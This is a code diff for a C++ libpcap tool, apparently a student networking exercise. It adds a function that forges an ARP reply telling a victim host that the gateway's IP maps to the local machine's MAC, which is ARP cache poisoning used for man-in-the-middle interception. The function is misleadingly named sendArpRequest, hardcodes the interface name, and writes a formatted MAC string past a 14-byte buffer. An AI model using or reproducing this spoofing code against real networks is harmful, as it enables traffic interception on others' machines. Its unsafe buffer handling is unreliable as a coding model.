@@ -66,7 +66,7 @@ char* getIpAddress(){
 }
 
 
-int sendArpRequest(char* myIp, char* myMac, char* sender_ip, pcap_t* handle){
+int sendRequest(char* myIp, char* myMac, char* sender_ip, pcap_t* handle){
 	struct ifreq s;
 	int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
 	char* mac ;	
@@ -178,6 +178,51 @@ Mac getSenderMac(char* dev,char* senderIP){
 }
 
 
+void sendArpRequest(char* dev, Mac smac, char* gatewayIp, char* senderIp){
+	 struct ifreq s;
+	int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
+	char* mac ;	
+	strcpy(s.ifr_name, "enp0s3");
+	ioctl(fd, SIOCGIFHWADDR, &s);
+	mac = reinterpret_cast<char *>(s.ifr_addr.sa_data);
+
+	sprintf(mac, "%02x:%02x:%02x:%02x:%02x:%02x", 
+	(unsigned char)s.ifr_hwaddr.sa_data[0],
+	(unsigned char)s.ifr_hwaddr.sa_data[1],
+	(unsigned char)s.ifr_hwaddr.sa_data[2],
+	(unsigned char)s.ifr_hwaddr.sa_data[3],
+	(unsigned char)s.ifr_hwaddr.sa_data[4],
+	(unsigned char)s.ifr_hwaddr.sa_data[5]);
+
+	char errbuf[PCAP_ERRBUF_SIZE];
+	pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
+	EthArpPacket packet;
+
+	packet.eth_.dmac_ = smac; // sender mac
+	packet.eth_.smac_ = Mac(mac); // my mac
+	packet.eth_.type_ = htons(EthHdr::Arp);
+
+	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
+	packet.arp_.pro_ = htons(EthHdr::Ip4);
+	packet.arp_.hln_ = Mac::SIZE;
+	packet.arp_.pln_ = Ip::SIZE;
+	packet.arp_.op_ = htons(ArpHdr::Reply);
+	packet.arp_.smac_ = Mac(mac); //my mac 
+	packet.arp_.sip_ = htonl(Ip(gatewayIp)); //gateway ip
+	packet.arp_.tmac_ = smac; //sender mac
+	packet.arp_.tip_ = htonl(Ip(senderIp)); //sender ip 
+
+	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
+	if (res != 0) {
+		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+}
+
+	pcap_close(handle);
+
+
+}
+
+
 int main(int argc, char* argv[]) {
 	if (argc < 4) {
 		usage();
@@ -201,9 +246,10 @@ int main(int argc, char* argv[]) {
 	printf("%s\n",myIp);
 	printf("%s",myMacAddress);
     
-	int request_result = sendArpRequest(myIp, myMacAddress, sender_ip, handle);
+	int request_result = sendRequest(myIp, myMacAddress, sender_ip, handle);
 	
-	Mac src_mac = getSenderMac(dev, sender_ip);
+	Mac sender_mac = getSenderMac(dev, sender_ip);
+	sendArpRequest(dev,sender_mac,target_ip,sender_ip);
 }
 
 
